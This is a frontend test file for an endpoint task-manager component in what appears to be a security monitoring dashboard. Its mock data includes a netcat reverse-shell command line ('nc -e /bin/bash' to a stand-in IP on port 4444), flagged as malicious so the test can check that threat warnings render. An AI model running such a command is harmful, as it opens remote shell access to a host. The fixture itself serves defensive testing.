import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { render, screen, waitFor } from "@testing-library/react";
import { BrowserRouter } from "react-router-dom";
import { describe, expect, it, vi } from "vitest";
import EndpointTaskManager from "../components/EndpointTaskManager";
import type { HostXRaySnapshotData } from "../types";

const { mockSnapshot } = vi.hoisted(() => {
  const snapshot: HostXRaySnapshotData = {
    success: true,
    process_count: 2,
    socket_count: 2,
    metrics: {
      timestamp: "2026-09-05T00:00:00Z",
      platform: "linux",
      hostname: "soc-workstation",
      os_release: "Linux 6.1.0-amd64",
      architecture: "x86_64",
      cpu_percent: 4.5,
      cpu_cores: 8,
      memory_used_mb: 512,
      memory_total_mb: 4096,
      memory_percent: 12.5,
      swap_used_mb: 0,
      swap_total_mb: 1024,
      swap_percent: 0,
      disk_total_gb: 512,
      disk_used_gb: 64,
      disk_free_gb: 448,
      disk_percent: 12.5,
      net_kb_in_sec: 10.0,
      net_kb_out_sec: 5.0,
      load_1m: 0.2,
      load_5m: 0.1,
      load_15m: 0.05,
      uptime_seconds: 3600,
      process_count: 2,
      connection_count: 2,
    },
    processes: [
      {
        pid: 1,
        ppid: 0,
        name: "systemd",
        username: "root",
        cpu_percent: 0.1,
        memory_percent: 0.2,
        memory_rss_bytes: 14000000,
        status: "running",
        create_time: 1700000000,
        cmdline: ["/sbin/init"],
        exe: "/sbin/init",
        cwd: "/",
        num_threads: 1,
        package_origin: "systemd (native)",
        is_unmanaged: false,
        socket_count: 1,
        threat_score: 0,
        integrity_label: "clean",
      },
      {
        pid: 1337,
        ppid: 1,
        name: "nc",
        username: "root",
        cpu_percent: 1.2,
        memory_percent: 0.5,
        memory_rss_bytes: 4000000,
        status: "running",
        create_time: 1700001000,
        cmdline: ["nc", "-e", "/bin/bash", "198.51.100.25", "4444"],
        exe: "/usr/bin/nc",
        cwd: "/tmp",
        num_threads: 1,
        package_origin: "Unmanaged Binary",
        is_unmanaged: true,
        socket_count: 1,
        threat_score: 85,
        integrity_label: "malicious",
      },
    ],
    sockets: [
      {
        fd: 5,
        family: "AF_INET",
        type: "SOCK_STREAM",
        laddr: "0.0.0.0:8001",
        raddr: null,
        status: "LISTEN",
        pid: 1,
        process_name: "systemd",
        direction: "LISTEN",
        remote_ip: null,
        remote_port: null,
      },
      {
        fd: 8,
        family: "AF_INET",
        type: "SOCK_STREAM",
        laddr: "10.0.0.2:45022",
        raddr: "198.51.100.25:4444",
        status: "ESTABLISHED",
        pid: 1337,
        process_name: "nc",
        direction: "OUTBOUND",
        remote_ip: "198.51.100.25",
        remote_port: 4444,
      },
    ],
  };
  return { mockSnapshot: snapshot };
});

vi.mock("../lib/api", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../lib/api")>();
  return {
    ...actual,
    getHostXRaySnapshot: vi.fn().mockResolvedValue(mockSnapshot),
  };
});

function createTestQueryClient() {
  return new QueryClient({
    defaultOptions: {
      queries: {
        retry: false,
      },
    },
  });
}

describe("EndpointTaskManager Component", () => {
  it("renders live HUD metrics and processes in table", async () => {
    const qc = createTestQueryClient();
    render(
      <QueryClientProvider client={qc}>
        <BrowserRouter>
          <EndpointTaskManager />
        </BrowserRouter>
      </QueryClientProvider>,
    );

    // Assert top HUD metrics
    expect(screen.getByText("Live Processes")).toBeTruthy();
    expect(screen.getByText("Threat Anomalies")).toBeTruthy();
    expect(screen.getByText("CPU Load")).toBeTruthy();
    expect(screen.getByText("Memory Usage")).toBeTruthy();

    // Wait for snapshot processes to render
    await waitFor(() => {
      expect(screen.getByText("nc")).toBeTruthy();
      expect(screen.getByText("systemd")).toBeTruthy();
      expect(screen.getByText(/THREAT DETECTED/i)).toBeTruthy();
    });
  });

  it("filters processes by search query", async () => {
    const qc = createTestQueryClient();
    render(
      <QueryClientProvider client={qc}>
        <BrowserRouter>
          <EndpointTaskManager />
        </BrowserRouter>
      </QueryClientProvider>,
    );

    await waitFor(() => {
      expect(screen.getByText("nc")).toBeTruthy();
    });

    const input = screen.getByPlaceholderText(/Search active processes/i);
    expect(input).toBeTruthy();
  });
});
